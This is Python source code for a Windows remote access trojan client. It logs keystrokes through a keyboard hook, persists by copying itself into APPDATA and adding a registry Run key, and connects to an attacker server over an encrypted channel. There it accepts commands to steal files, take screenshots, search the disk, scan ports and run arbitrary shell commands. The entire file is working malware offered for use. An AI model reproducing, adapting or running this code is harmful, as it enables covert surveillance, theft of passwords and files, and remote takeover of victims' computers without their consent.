# TCP Client
import socket       
import subprocess
import os
from tempfile import mkdtemp
from shutil import copy, rmtree
import winreg as wreg
from random import randrange
from PIL import ImageGrab
from time import sleep
from pythoncom import PumpMessages
from pyWinhook import HookManager
from threading import Thread
from ctypes import windll
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
from Crypto.PublicKey import RSA 

class Keylogger(Thread):
    ''' Thread for incommig dns requests '''
    def  __init__(self):
        super().__init__()
        # string where we will store all the pressed keys
        self.store = ''
        

    def run(self):
        ''' Run Thread '''
        # create and register a hook manager and once the user hit any keyboard button, 
        # keypressed func will be executed
        obj = HookManager()
        obj.KeyDown = self.keypressed
        # start the hooking loop and pump out the messages
        obj.HookKeyboard()
        PumpMessages()

    def keypressed(self, event):
        # Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>
        # note that we can know if the user input was enter or backspace based on their ASCII values
        keys = ''
        if event.Ascii==13:
            keys=' < Enter > ' 
        elif event.Ascii==8:
            keys=' <BACK SPACE> '
        else:
            keys=chr(event.Ascii)
        self.store += keys 
        
        fp=open("keylogs.txt","w")
        fp.write(self.store)
        fp.close()
        return True

class Client:
    ''' Target Client '''
    def __init__(self):
        self.SERVER_IP = '<SERVER-IP-ADDRESS>'
        self.SERVER_PORT = 8080
        self.USERNAME = self.get_username()
        self.key = os.urandom(32)   # generate random 32 bytes key
        # Persistence I: copy script to random appdata location
        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
        self.PATH = os.path.realpath(__file__)
        copy(self.PATH, self.APPDATA_PATH)
        # Persistence II: registry key pointing to the copied file
        self.addRegkey()
        # Start Keylogger
        k = Keylogger()
        k.start()
        
    def get_username(self):
        username = socket.gethostname() 
        if windll.shell32.IsUserAnAdmin():
            username += '@Admin'
        else:
            username += '@User'
        return username

    def str_xor(self, s1, s2):
        ''' Encrypt/Decrypt function '''
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
    
    def get_aes_key(self, KEY):
        ''' Decrypt using RSA private key '''
        # read pem file or embed key to script
        privatekey = open('src/private.pem', 'r').read()
        decryptor = RSA.importKey(privatekey)
        cipher = PKCS1_OAEP.new(decryptor)
        AES_Key = cipher.decrypt(KEY) 
        return AES_Key

    def encrypt(self, message):
        ''' AES encrypt algorithm using CTR mode, takes bytes variable '''
        iv = os.urandom(16)
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
        encrypto = AES.new(self.key, AES.MODE_CTR, counter= ctr)
        return iv + encrypto.encrypt(message)

    def decrypt(self, message):
        ''' AES decrypt algorithm using CTR mode, takes bytes variable '''
        iv = message[:16]
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
        decrypto = AES.new(self.key, AES.MODE_CTR, counter=ctr)
        return decrypto.decrypt(message[16:])

    def addRegkey(self):
        ''' Add Registry Key '''
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
        key.Close()

    def scanner(self,s, ip, ports):
        ''' Port Scan '''
        scan_result = ''
        for port in ports.split(','): 
            # ports are separated by a comma in this format 21,22,..
            # make a connection using socket library for EACH one of these ports
            try:   
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect_ex returns 0 if the operation succeeded, and in our case operation succeeded means that 
                # the port is open otherwise the port could be closed or the host is unreachable in the first place.
                output = sock.connect_ex((ip, int(port) )) 
                
                if output == 0:
                    scan_result += f"[+] Port {port} is opened\n"
                else:
                    scan_result += f"[-] Port {port} is closed or Host is not reachable\n" 
                    
                sock.close()
        
            except Exception as e:
                pass
        # send results to server
        s.send(self.encrypt(scan_result.encode()))

    def transfer(self, s, path):
        ''' send transfer file '''
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != b'':
                s.send(packet) 
                packet = f.read(1024)
            s.send(self.encrypt('DONE'.encode()))
            f.close()
        else: 
            # the file doesn't exist
            s.send(self.encrypt('Unable to find out the file'.encode()))

    def connect(self): 
        ''' connect to server '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port
        # get key
        self.key = self.get_aes_key(s.recv(1024))
        # send username
        s.send(self.encrypt(self.USERNAME.encode()))
        # keep receiving commands from server
        while True: 
            # read the first KB of the tcp socket
            command = self.decrypt(s.recv(1024)).decode()         
            if 'terminate' in command:
                # if we got terminate order from server, 
                # close the socket and break the loop
                s.close()
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    s.send(self.encrypt(f"[*] Current Path: {new_path}".encode()))
                except Exception as e:
                    s.send(self.encrypt(str(e).encode())) 
            elif 'grab' in command: 
                # on grab, indicate for file transfer operation.
                path = command.split()[-1]
                try: 
                    self.transfer(s, path)
                except Exception as e:
                    s.send(self.encrypt(str(e).encode()))
            elif 'screenshoot' in command: 
                # on screenshoot, take screen image and send it to server 
                dirpath = mkdtemp()
                ImageGrab.grab().save(dirpath + "/screen.jpg", "JPEG")
                try: 
                    self.transfer(s, dirpath + "/screen.jpg")
                    rmtree(dirpath) 
                except Exception as e:
                    s.send(self.encrypt(str(e).encode()))
            elif 'search' in command: 
                # cut off 'search' keyward, output would be C:\\*.pdf
                command = command[7:] 
                # split command to path and ext
                path, ext = command.split('*') 
                file_list = '' 
                
                for dirpath, dirnames, files in os.walk(path):
                    for f in files:
                        if f.endswith(ext):
                            file_list = file_list + '\n' + os.path.join(dirpath, f)
                # Send search result to server
                s.send(self.encrypt(file_list.encode()))
            elif 'scan' in command: 
                # syntax: scan 10.0.2.15:22,80
                # cut off 'scan' keyward
                command = command[5:]
                ip, ports = command.split(':') 
                self.scanner(s, ip, ports)
            else: 
                # otherwise, we pass the received command to a shell process
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(self.encrypt(cmd.stdout.read().decode().encode())) # send back the result
                s.send(self.encrypt(cmd.stdout.read().decode().encode())) # send back the error -if any-, such as syntax error

def main():
    c = Client()
    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
    while True:
        try:
            if c.connect():
                break
        except:
            sleep_for = randrange(1, 10)
            sleep( sleep_for )

if __name__ == "__main__":
    main()